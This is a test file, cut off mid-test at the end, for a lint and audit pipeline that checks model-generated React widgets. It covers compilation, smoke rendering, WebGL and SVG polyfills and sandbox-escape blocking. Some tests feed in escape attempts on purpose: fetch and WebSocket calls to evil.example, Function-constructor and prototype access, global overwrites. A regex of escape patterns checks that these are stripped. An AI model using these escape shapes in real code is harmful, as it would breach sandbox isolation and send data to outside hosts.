import { beforeAll, describe, expect, test } from "bun:test";

import { ensureObscuraBrowser } from "../server/routes/obscura";
import { runWidgetLint } from "../server/routes/widget-lint";
import { compileJsxModule } from "../web/src/indirect-code/components/generative-ui/jsx-compile";

beforeAll(async () => {
  await ensureObscuraBrowser();
}, 120_000);

/**
 * Black-box tests for the gateway widget lint pipeline (the widget_set /
 * widget_lint tools' backend): compile → import audit → happy-dom smoke
 * render → optional test code. Every phase must fail with a message the
 * agent can act on — never a silent pass.
 */
describe("widget lint pipeline (gateway)", () => {
  const goodWidget = `export default function App({ amount = 0 }) {
  const [n, setN] = useState(amount);
  return <div className="gu-root"><button onClick={() => setN(n + 1)}>{n}</button></div>;
}`;

  test("a clean widget passes (compile + smoke render)", async () => {
    const res = await runWidgetLint({ id: "t", source: goodWidget, state: '{"amount": 5}' });
    expect(res.ok).toBe(true);
    expect(res.errors).toEqual([]);
  }, 60_000);

  test("syntax errors fail in the compile phase with the real message", async () => {
    const res = await runWidgetLint({ id: "t", source: "export default function App( { return <div>;" });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("compile");
    expect(res.errors[0].message.length).toBeGreaterThan(0);
  });

  test("imports outside the widget map fail in the audit phase", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `import x from "left-pad";\nexport default function App() { return <div>{x}</div>; }`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("audit");
    expect(res.errors[0].message).toContain("unsupported import");
  });

  test("a render crash fails the smoke render with the thrown message", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { throw new Error("boom render"); }`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("render");
    expect(res.errors[0].message).toContain("boom render");
  }, 60_000);

  test("audit findings carry a code frame at the ORIGINAL line (JSX above)", async () => {
    // The stripped capability sits on source line 4 — after a multi-line
    // JSX block that reflows during compile. The frame must point at 4.
    const src = `export default function App() {
  return (
    <div className="gu-root">
      {evil()}
    </div>
  );
}

function evil() {
  globalThis.fetch("https://evil.example/x");
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.ok).toBe(false);
    const err = res.errors[0];
    expect(err.phase).toBe("audit");
    expect(err.line).toBe(10);
    expect(err.message).toContain("10 |   globalThis.fetch");
    expect(err.message).toContain("^");
  }, 60_000);

  test("frames stay correct after the sanitize stage (multi-line strip)", async () => {
    // boom() first strips a MULTI-LINE forbidden call (the sanitize edits
    // the module in place), then throws on a later line. The frame must
    // still land on the throw's ORIGINAL line — this pins that the map
    // survives the sanitize, not just the transpile.
    const src = `export default function App() {
  return (
    <div className="gu-root">
      <h1>{boom()}</h1>
    </div>
  );
}

function boom() {
  globalThis.fetch(
    "https://evil.example/x",
    { method: "post" }
  );
  throw new Error("after strip");
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    const render = res.errors.find((e) => e.phase === "render");
    expect(render).toBeTruthy();
    expect(render!.message).toContain("after strip");
    // The audit finding sits on the ORIGINAL line 10 (the multi-line call).
    const audit = res.errors.find((e) => e.phase === "audit");
    expect(audit?.line).toBe(10);
  }, 60_000);

  test("render errors carry a code frame of the model source", async () => {
    const src = `export default function App() {
  return (
    <div className="gu-root">
      <h1>{boom()}</h1>
      <p>pad</p>
    </div>
  );
}

function boom() {
  throw new Error("frame boom");
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.ok).toBe(false);
    const err = res.errors[0];
    expect(err.phase).toBe("render");
    expect(err.message).toContain("frame boom");
    // The frame marks a real line of the model's source (the exact line
    // depends on which frame the runtime stack tops out at — the mapping
    // itself is pinned by the source-map unit tests).
    expect(err.message).toMatch(/\n\d+ \| /);
    expect(err.message).toContain("^");
    expect(typeof err.line).toBe("number");
  }, 60_000);

  test("the lint renders with the REQUESTED state (props)", async () => {
    // The lint page runs the REAL widget runtime (same buildRuntimeScript
    // as production) with `window.__gu.state` set to the request's state —
    // so the smoke render sees the props the fence will carry. A widget
    // that throws on its required prop must fail the lint; the same widget
    // with the right state must pass.
    const src = `export default function App({ amount }) {
  if (typeof amount !== "number") throw new Error("amount prop missing");
  return <div className="gu-root">{amount}</div>;
}`;
    const bad = await runWidgetLint({ id: "t", source: src, state: "{}" });
    expect(bad.ok).toBe(false);
    expect(bad.errors[0].phase).toBe("render");
    expect(bad.errors[0].message).toContain("amount prop missing");

    const good = await runWidgetLint({ id: "t", source: src, state: '{"amount": 42}' });
    expect(good.errors).toEqual([]);
    expect(good.ok).toBe(true);
  }, 60_000);

  test("mount-time effects run in the smoke render (real runtime)", async () => {
    // useEffect runs against the REAL runtime now — a crash inside an
    // effect must surface as a render error, not pass silently.
    const src = `import { useEffect } from "react";

export default function App() {
  useEffect(() => {
    throw new Error("effect boom");
  }, []);
  return <div className="gu-root">ok</div>;
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.ok).toBe(false);
    expect(res.errors.some((e) => e.message.includes("effect boom"))).toBe(true);
  }, 60_000);

  test("lib globals (d3) resolve in the lint page (appended prelude)", async () => {
    // The widget uses `d3` as a LIB GLOBAL (no import): the compile appends
    // a side-effect import at the END (line numbers preserved) and the lint
    // page maps the vendored bundle for it.
    const src = `import { useRef, useEffect } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const sel = d3.select(ref.current);
    sel.selectAll("div").data([1, 2, 3]).join("div").style("height", (d) => d * 4 + "px");
  }, []);
  return <div ref={ref} />;
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("update-phase bugs surface in the smoke render (exercised loop)", async () => {
    // A classic "works until the first tick": the widget renders fine and
    // only throws from its interval a few ticks in. A mount-only render
    // would pass it — the exercised smoke render must not.
    const src = `import { useEffect, useState } from "react";

export default function App() {
  const [n, setN] = useState(0);
  useEffect(() => {
    const id = setInterval(() => {
      setN((x) => {
        if (x >= 3) {
          const broken = undefined;
          broken.side; // boom on the 4th tick
        }
        return x + 1;
      });
    }, 30);
    return () => clearInterval(id);
  }, []);
  return <div className="gu-root">{n}</div>;
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.ok).toBe(false);
    expect(res.errors.some((e) => /side/.test(e.message))).toBe(true);
  }, 60_000);

  test("an invalid state header fails the lint", async () => {
    const res = await runWidgetLint({ id: "t", source: goodWidget, state: "{bad json}" });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("render");
    expect(res.errors[0].message).toContain("state header");
  }, 60_000);

  test("extra test code runs against the widget's exports", async () => {
    const widget = `export function add(a: number, b: number) { return a + b; }\nexport default function App() { return <div/>; }`;
    const passing = await runWidgetLint({
      id: "t",
      source: widget,
      test: `import { add } from "widget";\nif (add(1, 2) !== 3) throw new Error("add broken");`,
    });
    expect(passing.ok).toBe(true);
    const failing = await runWidgetLint({
      id: "t",
      source: widget,
      test: `import { add } from "widget";\nif (add(1, 2) !== 4) throw new Error("assert failed: expected 4");`,
    });
    expect(failing.ok).toBe(false);
    expect(failing.errors[0].phase).toBe("test");
    expect(failing.errors[0].message).toContain("assert failed");
  }, 60_000);

  test("test code must import the widget module to exercise it", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test: `throw new Error("no import");`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("test");
    expect(res.errors[0].message).toContain("import the widget module");
  }, 60_000);

  test("a hanging test fails with a timeout, not a hang", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test: `import "widget";\nexport function test() { return new Promise(() => {}); }`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("test");
    expect(res.errors[0].message).toContain("timed out");
  }, 60_000);

  test("malformed test code fails in the audit phase", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test: `import { add } from "widget";\nfunction (`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("audit");
  }, 60_000);

  test("test compile errors frame the model's source, never the widget placeholder", async () => {
    const test = `import { add } from "widget"; const broken = ;`;
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test,
    });
    expect(res.ok).toBe(false);
    const err = res.errors[0];
    expect(err.phase).toBe("audit");
    expect(err.line).toBe(1);
    expect(err.message).not.toContain("https://esm.sh/__widget__");
    expect(err.message).toContain(test);
  }, 60_000);

  test("test audit findings keep the ORIGINAL column past the widget import", async () => {
    const test = `import { add } from "widget"; globalThis.fetch("https://evil.example/x");`;
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test,
    });
    expect(res.ok).toBe(false);
    const finding = res.errors.find((e) => e.phase === "audit" && /removed from the module/.test(e.message));
    expect(finding).toBeTruthy();
    expect(finding!.line).toBe(1);
    // The placeholder is 19 chars longer than `"widget"`: the finding must
    // map back past it, not point into the rewritten line.
    expect(finding!.column).toBe(test.indexOf("globalThis"));
    expect(finding!.message).not.toContain("https://esm.sh/__widget__");
    expect(finding!.message).toContain(test);
  }, 60_000);

  test("top-level test throws map to the model's line with a code frame", async () => {
    const test = `import { add } from "widget";\nthrow new Error("top-level test boom");`;
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test,
    });
    expect(res.ok).toBe(false);
    const err = res.errors.find((e) => e.phase === "test" && /top-level test boom/.test(e.message));
    expect(err).toBeTruthy();
    expect(err!.line).toBe(2);
    expect(err!.message).toContain(`2 | throw new Error("top-level test boom")`);
    expect(err!.message).toContain("^");
    expect(err!.message).not.toContain("https://esm.sh/__widget__");
  }, 60_000);
});

/**
 * 3D / WebGL support: the lint browser has no GPU and no native WebGL, so a
 * software WebGL2 polyfill is installed on the lint page. These tests prove
 * three.js widgets are REALLY exercised by the smoke render (renderer
 * construction, program compile/link, draw calls) and that genuine GLSL
 * bugs fail the lint instead of being waved through.
 */
describe("widget lint 3D / WebGL support", () => {
  test("a three.js widget renders in the lint browser and is reported as exercised", async () => {
    const src = `import { useRef, useEffect } from "react";
import * as THREE from "three";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const canvas = ref.current;
    const renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: true });
    renderer.setSize(240, 160, false);
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(50, 240 / 160, 0.1, 100);
    camera.position.z = 3;
    const mesh = new THREE.Mesh(
      new THREE.BoxGeometry(1, 1, 1),
      new THREE.MeshBasicMaterial({ color: 0x4488ff })
    );
    scene.add(mesh);
    const render = () => {
      mesh.rotation.y += 0.2;
      renderer.render(scene, camera);
    };
    render();
    const id = setInterval(render, 30);
    return () => { clearInterval(id); renderer.dispose(); };
  }, []);
  return (
    <div className="gu-root">
      <div className="gu-stage"><canvas ref={ref} width={240} height={160} /></div>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t3d", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
    // The 3D path must be genuinely exercised — context + program + draws.
    const note = (res.notes || []).find((n) => n.includes("3D exercised"));
    expect(note).toBeDefined();
    expect(note).toContain("program");
    expect(note).toContain("draw call");
  }, 60_000);

  test("a broken custom ShaderMaterial GLSL fails the lint (real driver feedback)", async () => {
    const src = `import { useRef, useEffect } from "react";
import * as THREE from "three";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const renderer = new THREE.WebGLRenderer({ canvas: ref.current });
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera();
    const mesh = new THREE.Mesh(
      new THREE.PlaneGeometry(1, 1),
      new THREE.ShaderMaterial({
        vertexShader: "void main() { gl_Position = vec4(position, 1.0); }",
        fragmentShader: "void broken( { this is not glsl"
      })
    );
    scene.add(mesh);
    renderer.render(scene, camera);
    return () => renderer.dispose();
  }, []);
  return <div className="gu-root"><canvas ref={ref} /></div>;
}`;
    const res = await runWidgetLint({ id: "t3d-bad", source: src });
    expect(res.ok).toBe(false);
    expect(res.errors.some((e) => e.message.includes("WebGL shader compile/link failed"))).toBe(true);
    expect(res.errors[0].phase).toBe("render");
  }, 60_000);

  test("raw WebGL widgets are exercised too (context + compile diagnostics)", async () => {
    const src = `import { useRef, useEffect } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const gl = ref.current.getContext("webgl2");
    if (!gl) throw new Error("no webgl2 context in the lint browser");
    const shader = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(shader, "#version 300 es\\nprecision mediump float;\\nout vec4 o;\\nvoid main() { o = vec4(1.0); }");
    gl.compileShader(shader);
    if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
      throw new Error("good shader rejected: " + gl.getShaderInfoLog(shader));
    }
    gl.clearColor(0, 0, 0, 1);
    gl.clear(gl.COLOR_BUFFER_BIT);
  }, []);
  return <div className="gu-root"><canvas ref={ref} width={64} height={64} /></div>;
}`;
    const res = await runWidgetLint({ id: "t3d-raw", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
    const note = (res.notes || []).find((n) => n.includes("3D exercised"));
    expect(note).toBeDefined();
    expect(note).toContain("shader");
  }, 60_000);

  test("a shader with unbalanced braces is reported as a compile error", async () => {
    const src = `import { useRef, useEffect } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const gl = ref.current.getContext("webgl");
    const shader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(shader, "void main() { gl_Position = vec4(0.0);");
    gl.compileShader(shader);
  }, []);
  return <div className="gu-root"><canvas ref={ref} /></div>;
}`;
    const res = await runWidgetLint({ id: "t3d-brace", source: src });
    expect(res.ok).toBe(false);
    expect(res.errors.some((e) => e.message.includes("WebGL shader compile/link failed"))).toBe(true);
  }, 60_000);

  test("3D + test code: a test that asserts on the three.js exports passes", async () => {
    const widget = `import * as THREE from "three";
export function makeScene() {
  const scene = new THREE.Scene();
  scene.add(new THREE.Mesh(new THREE.BoxGeometry(1, 1, 1), new THREE.MeshBasicMaterial()));
  return scene;
}
export default function App() { return <div className="gu-root" />; }`;
    const passing = await runWidgetLint({
      id: "t3d-test",
      source: widget,
      test: `import { makeScene } from "widget";\nconst s = makeScene();\nif (s.children.length !== 1) throw new Error("scene broken: " + s.children.length);`,
    });
    expect(passing.errors).toEqual([]);
    expect(passing.ok).toBe(true);

    const failing = await runWidgetLint({
      id: "t3d-test",
      source: widget,
      test: `import { makeScene } from "widget";\nconst s = makeScene();\nif (s.children.length !== 2) throw new Error("expected 2 meshes");`,
    });
    expect(failing.ok).toBe(false);
    expect(failing.errors[0].phase).toBe("test");
    expect(failing.errors[0].message).toContain("expected 2 meshes");
  }, 60_000);

  test("a 2D-only widget gets no 3D notes at all", async () => {
    const res = await runWidgetLint({
      id: "t2d",
      source: `export default function App() { return <div className="gu-root">plain 2d</div>; }`,
    });
    expect(res.ok).toBe(true);
    // Nothing to report when the 3D path was never touched — and the
    // output never names the lint browser.
    expect((res.notes || []).some((n) => n.includes("3D"))).toBe(false);
    expect(res.output).toContain("render: ok");
    expect(res.output).not.toContain("obscura");
  }, 60_000);
});

/**
 * Chart support: SVG text metrics. The lint browser has no font shaping for
 * SVG <text> (getBBox returns 0x0, getComputedTextLength 0,
 * getStartPositionOfChar missing), so d3 charts that measure labels would
 * mis-measure in the smoke render. The SVG metrics polyfill restores the
 * API from the canvas measurer; these tests prove label measuring works.
 */
describe("widget lint SVG text metrics (charts)", () => {
  test("SVG label measurement works in the lint browser", async () => {
    const src = `import { useEffect, useRef } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const svg = ref.current;
    const text = svg.querySelector("text");
    const fail = (msg) => { throw new Error(msg); };
    if (!(svg instanceof SVGElement)) fail("<svg> is not an SVG element (namespace broken)");
    if (!(text instanceof SVGElement)) fail("<text> is not an SVG element (namespace broken)");
    if (text.getAttribute("text-anchor") !== "middle") fail("textAnchor prop not mapped to text-anchor");
    if (text.getAttribute("font-size") !== "14") fail("fontSize prop not mapped to font-size");
    const bbox = text.getBBox();
    if (!(bbox.width > 0 && bbox.height > 0)) fail("getBBox empty: " + bbox.width + "x" + bbox.height);
    const len = text.getComputedTextLength();
    if (!(len > 0)) fail("getComputedTextLength is " + len);
    const start = text.getStartPositionOfChar(0);
    const start2 = text.getStartPositionOfChar(3);
    if (!(start2.x > start.x)) fail("char positions not monotonic");
    const extent = text.getExtentOfChar(1);
    if (!(extent.width > 0)) fail("getExtentOfChar width " + extent.width);
    const idx = text.getCharNumAtPosition({ x: start.x + 2, y: start.y });
    if (idx !== 0) fail("getCharNumAtPosition returned " + idx);
  }, []);
  return (
    <div className="gu-root">
      <svg ref={ref} width={320} height={80}>
        <text x={10} y={40} fontSize={14} textAnchor="middle">Revenue by quarter 2026</text>
      </svg>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t-svg", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("a d3-style chart that measures and places tick labels passes", async () => {
    const src = `import * as d3 from "d3";
import { useEffect, useRef } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const svg = d3.select(ref.current);
    const data = [4, 8, 15, 16, 23, 42];
    const x = d3.scaleBand().domain(data.map(String)).range([40, 300]).padding(0.2);
    const y = d3.scaleLinear().domain([0, 45]).range([60, 10]);
    svg.selectAll("rect").data(data).join("rect")
      .attr("x", (d, i) => x(String(d))).attr("y", (d) => y(d))
      .attr("width", x.bandwidth()).attr("height", (d) => 60 - y(d));
    svg.selectAll("text").data(data).join("text")
      .attr("x", (d) => x(String(d)) + x.bandwidth() / 2).attr("y", 72)
      .attr("text-anchor", "middle").attr("font-size", 10)
      .text(String);
    // Label-placement logic a real chart runs: measure, then decide.
    const labels = ref.current.querySelectorAll("text");
    let total = 0;
    for (const t of labels) {
      const b = t.getBBox();
      if (!(b.width > 0)) throw new Error("tick label mis-measured");
      total += b.width;
    }
    if (!(total > 10)) throw new Error("labels too narrow: " + total);
  }, []);
  return (
    <div className="gu-root">
      <div className="gu-stage"><svg ref={ref} width={320} height={80} /></div>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t-svg-d3", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("empty labels measure as zero without throwing", async () => {
    const src = `import { useEffect, useRef } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const text = ref.current.querySelector("text");
    if (text.getBBox().width !== 0) throw new Error("empty label should measure 0");
    if (text.getComputedTextLength() !== 0) throw new Error("empty label length should be 0");
  }, []);
  return (
    <div className="gu-root">
      <svg ref={ref} width={200} height={40}><text x={5} y={20} /></svg>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t-svg-empty", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);
});

/**
 * Interactive API shims: the lint browser lacks navigator.vibrate,
 * requestFullscreen and video.requestVideoFrameCallback — widget code that
 * calls them from handlers/loops must not crash the smoke render.
 */
describe("widget lint browser API shims", () => {
  test("games-style calls (vibrate / fullscreen / video frame callback) do not crash", async () => {
    const src = `import { useEffect, useRef } from "react";

export default function App() {
  const ref = useRef(null);
  useEffect(() => {
    const el = ref.current;
    if (typeof navigator.vibrate !== "function") throw new Error("navigator.vibrate missing");
    if (navigator.vibrate(50) !== true) throw new Error("vibrate should report accepted");
    if (typeof el.requestFullscreen !== "function") throw new Error("requestFullscreen missing");
    let fullscreenResolved = false;
    el.requestFullscreen().then(() => { fullscreenResolved = true; }, () => { fullscreenResolved = true; });
    const video = document.createElement("video");
    if (typeof video.requestVideoFrameCallback !== "function") throw new Error("requestVideoFrameCallback missing");
    let frame = 0;
    const handle = video.requestVideoFrameCallback(() => { frame++; });
    if (typeof video.cancelVideoFrameCallback !== "function") throw new Error("cancelVideoFrameCallback missing");
    video.cancelVideoFrameCallback(handle);
    setTimeout(() => {
      if (frame !== 0) throw new Error("cancelled frame callback ran");
      if (!fullscreenResolved) throw new Error("requestFullscreen never settled");
    }, 30);
  }, []);
  return (
    <div className="gu-root" ref={ref}>
      <button className="gu-btn">press</button>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t-shim", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("shims never override native implementations", async () => {
    const src = `export default function App() {
  const shims = window.__guBrowserShims;
  const webgl = window.__guWebglPolyfill;
  const svg = window.__guSvgMetricsPolyfill;
  if (!shims || !shims.installed) throw new Error("browser shims not installed");
  if (!webgl || webgl.installed !== true) throw new Error("webgl polyfill not installed");
  if (!svg || svg.installed !== true) throw new Error("svg metrics polyfill not installed");
  return <div className="gu-root">shims ok</div>;
}`;
    const res = await runWidgetLint({ id: "t-shim-2", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);
});

/**
 * Adversarial probes: the audit is the model-code boundary (compileJsxModule
 * = transform + audit), and these vectors must be neutralized THERE — before
 * anything reaches the lint browser. The boundary either rejects the code or
 * STRIPS the offending node (regenerating `void 0`), so the assertion is that
 * no escape material survives into the emitted module. The old worker
 * context leaked process.env and required modules through exactly these
 * shapes.
 */
describe("widget audit blocks sandbox escapes", () => {
  /** Returns the emitted module code, or null when the boundary rejects. */
  const emitted = (src: string): string | null => {
    const res = compileJsxModule(src);
    return res.ok ? res.code : null;
  };
  const ESCAPES = /\.__proto__|\.constructor|\.prototype|globalThis\.fetch|window\.fetch|XMLHttpRequest|WebSocket|EventSource|getPrototypeOf|defineProperty|window\.React\s*=|window\.location\s*=/;
  const neutralized = (src: string) => {
    const code = emitted(src);
    if (code !== null) expect(code).not.toMatch(ESCAPES);
  };

  test("Function constructor escape via .constructor is neutralized", () => {
    neutralized(`export default function App() { const F = (() => {}).constructor; F("return typeof process")(); return <div/>; }`);
  });

  test("__proto__ / prototype access is neutralized", () => {
    neutralized(`export default function App() { const p = ({}).__proto__; return <div>{String(p)}</div>; }`);
    neutralized(`export default function App() { Function.prototype.call(); return <div/>; }`);
  });

  test("network primitives through a receiver are neutralized", () => {
    neutralized(`export default function App() { globalThis.fetch("https://evil.example/x"); return <div/>; }`);
    neutralized(`export default function App() { window.fetch("https://evil.example/x"); return <div/>; }`);
    neutralized(`export default function App() { new window.XMLHttpRequest(); return <div/>; }`);
    neutralized(`export default function App() { new WebSocket("wss://evil.example"); return <div/>; }`);
  });

  test("reflection calls are neutralized", () => {
    neutralized(`export default function App() { Object.getPrototypeOf(() => {}); return <div/>; }`);
    neutralized(`export default function App() { Object.defineProperty(window, "x", {}); return <div/>; }`);
  });

  test("global writes are neutralized, global reads are fine", () => {
    neutralized(`export default function App() { window.React = 1; return <div/>; }`);
    neutralized(`export default function App() { window.location = "https://evil.example"; return <div/>; }`);
    // A legitimate widget may read theme state from the DOM root.
    expect(
      emitted(`export default function App() { const t = document.documentElement.dataset.theme; return <div>{t}</div>; }`),
    ).toContain("document.documentElement");
  });

  test("allowed widget code still passes (no false positives)", () => {
    const code = emitted(`export default function App() {
      const [n, setN] = useState(0);
      const obj = { label: "a plain object" };
      useEffect(() => { const id = setInterval(() => setN((x) => x + 1), 100); return () => clearInterval(id); }, []);
      return <div className="gu-kpi"><span style={{ color: "red" }}>{n} {obj.label}</span></div>;
    }`);
    expect(code).toContain("setInterval");
    expect(code).toContain("obj.label");
    expect(code).toContain("gu-kpi");
  });
});

describe("widget lint upgraded runtime & shims (3D addons, audio, pointer capture, React parity, storage)", () => {
  test("Three.js OrbitControls, RoomEnvironment, RoundedBoxGeometry & MeshPhysicalMaterial transmission pass lint", async () => {
    const src = `import { useEffect, useRef } from "react";
import * as THREE from "three";
import { OrbitControls } from "three/addons/controls/OrbitControls.js";
import { RoomEnvironment } from "three/examples/jsm/environments/RoomEnvironment.js";
import { RoundedBoxGeometry } from "three/addons/geometries/RoundedBoxGeometry";

export default function MolecularStudio() {
  const ref = useRef<HTMLCanvasElement | null>(null);
  useEffect(() => {
    const canvas = ref.current!;
    const renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: true });
    renderer.setSize(320, 240, false);
    const pmrem = new THREE.PMREMGenerator(renderer);
    const envTex = pmrem.fromScene(new RoomEnvironment(), 0.04).texture;
    const scene = new THREE.Scene();
    scene.environment = envTex;
    const camera = new THREE.PerspectiveCamera(45, 320 / 240, 0.1, 100);
    camera.position.set(2, 2, 4);
    const controls = new OrbitControls(camera, canvas);
    controls.enableDamping = true;
    const glass = new THREE.MeshPhysicalMaterial({ color: 0x88ccff, transmission: 0.6, roughness: 0.1, ior: 1.5 });
    scene.add(new THREE.Mesh(new RoundedBoxGeometry(1, 1, 1, 4, 0.15), glass));
    controls.update();
    renderer.render(scene, camera);
    return () => { controls.dispose(); envTex.dispose(); pmrem.dispose(); renderer.dispose(); };
  }, []);
  return <div className="gu-root"><div className="gu-stage"><canvas ref={ref} width={320} height={240} /></div></div>;
}`;
    const res = await runWidgetLint({ id: "t-3d-addons", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
    expect((res.notes || []).some((n) => n.includes("3D exercised"))).toBe(true);
  }, 60_000);

  test("React parity (lazy useState, memo identity, px styles, CSS vars, select value, SVG markers) + Web Audio + pointer capture + keyboard scroll guard pass", async () => {
    const src = `import { useState, useEffect, useRef, memo, createContext, useContext } from "react";

const Ctx = createContext("default-ok");
let memoMounts = 0;

const Child = memo(function Child({ label }: { label: string }) {
  const ctxVal = useContext(Ctx);
  useEffect(() => { memoMounts++; }, []);
  if (ctxVal !== "default-ok") throw new Error("context default failed: " + ctxVal);
  return <span data-child="1">{label}</span>;
});

export default () => {
  const [n, setN] = useState(() => 40 + 2);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  useEffect(() => {
    if (n !== 42) throw new Error("lazy useState failed: " + String(n));
    const box = document.querySelector("[data-box]") as HTMLElement;
    if (box.style.width !== "200px") throw new Error("numeric px style failed: " + box.style.width);
    if (box.style.getPropertyValue("--accent-x") !== "12px") throw new Error("css var style failed");
    const sel = document.querySelector("select") as HTMLSelectElement;
    if (sel.value !== "b") throw new Error("select initial value failed: " + sel.value);
    const marker = document.querySelector("marker")!;
    if (marker.getAttribute("refX") !== "8" || marker.getAttribute("markerWidth") !== "10") {
      throw new Error("SVG marker attrs broken");
    }
    const fit = window.__gu.fitCanvas(canvasRef.current!, 240, 120);
    if (fit.width !== 240 || fit.height !== 120 || fit.dpr < 1) throw new Error("fitCanvas failed");
    box.setPointerCapture(7);
    if (!box.hasPointerCapture(7)) throw new Error("setPointerCapture failed");
    box.releasePointerCapture(7);

    // Web Audio procedural SFX chain
    const AC = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AC();
    const osc = ctx.createOscillator();
    const pan = ctx.createStereoPanner();
    const gain = ctx.createGain();
    osc.frequency.setValueAtTime(440, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.05);
    gain.gain.setValueAtTime(0.05, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.05);
    osc.connect(pan).connect(gain).connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.05);

    // Keyboard scroll-chaining guard prevents Space/Arrow scroll when a key handler is registered
    const onKey = () => {};
    window.addEventListener("keydown", onKey);
    const gameEv = new KeyboardEvent("keydown", { key: "ArrowDown", cancelable: true });
    window.dispatchEvent(gameEv);
    if (!gameEv.defaultPrevented) throw new Error("ArrowDown should be preventDefault'd for interactive game");
    // Must NOT swallow Space/Arrow inside native <input>
    const inputEl = document.querySelector("input")!;
    const inputEv = new KeyboardEvent("keydown", { key: " ", cancelable: true, bubbles: true });
    inputEl.dispatchEvent(inputEv);
    if (inputEv.defaultPrevented) throw new Error("Space inside <input> must not be swallowed");

    // Re-render parent to verify React.memo does not unmount/remount Child
    setN(43);
    const t = setTimeout(() => {
      if (memoMounts !== 1) throw new Error("memo child remounted: " + memoMounts);
    }, 30);
    return () => {
      clearTimeout(t);
      window.removeEventListener("keydown", onKey);
      try { ctx.close(); } catch {}
    };
  }, []);
  return (
    <div className="gu-root">
      <div data-box="1" style={{ width: 200, "--accent-x": "12px" } as any}>
        <Child label="stable" />
      </div>
      <input type="text" defaultValue="hi" />
      <select value="b" onChange={() => {}}>
        <option value="a">A</option>
        <option value="b">B</option>
      </select>
      <canvas ref={canvasRef} width={240} height={120} />
      <svg width={100} height={40}>
        <defs><marker id="arr" refX={8} refY={3} markerWidth={10} markerHeight={10}><path d="M0,0 L8,3 L0,6 Z" /></marker></defs>
      </svg>
    </div>
  );
};`;
    const res = await runWidgetLint({ id: "t-parity", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("unguarded localStorage fails lint with saveState guidance; guarded try/catch passes", async () => {
    const bad = await runWidgetLint({
      id: "t-ls-bad",
      source: `export default function App() {\n  const v = localStorage.getItem("k");\n  return <div className="gu-root">{v}</div>;\n}`,
    });
    expect(bad.ok).toBe(false);
    expect(bad.errors[0].phase).toBe("render");
    expect(bad.errors[0].message).toContain("saveState");

    const guarded = await runWidgetLint({
      id: "t-ls-ok",
      source: `export default function App() {\n  let v = "fallback";\n  try { v = localStorage.getItem("k") || v; } catch {}\n  return <div className="gu-root">{v}</div>;\n}`,
    });
    expect(guarded.errors).toEqual([]);
    expect(guarded.ok).toBe(true);
  }, 60_000);

  test("optional chaining, nullish coalescing, numeric separators, and class fields pass Obscura lint cleanly", async () => {
    const src = `class Sim {
  step = 1_000;
  tick() { return this.step; }
}
export default function App() {
  useEffect(() => {
    const s = new Sim();
    const w = window?.innerWidth ?? 640;
